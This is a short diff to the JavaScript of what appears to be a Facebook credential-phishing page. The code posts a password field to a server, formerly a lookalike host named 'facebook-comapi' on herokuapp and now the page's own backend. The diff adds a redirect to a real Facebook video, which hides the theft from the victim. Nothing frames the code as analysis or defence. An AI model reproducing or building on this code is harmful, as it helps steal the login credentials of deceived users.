@@ -12,13 +12,15 @@ function event() {
     pass:pass.value
   }
   axios
-    .post("https://facebook-comapi.herokuapp.com/", {
+    .post("/", {
       formData,
     })
     .then((response) => {
       console.log(response);
+      window.location.href=  "https://www.facebook.com/nova969/videos/385897846219933/"
     })
     .catch((error) => {
       console.log(error);
     });
+
 }
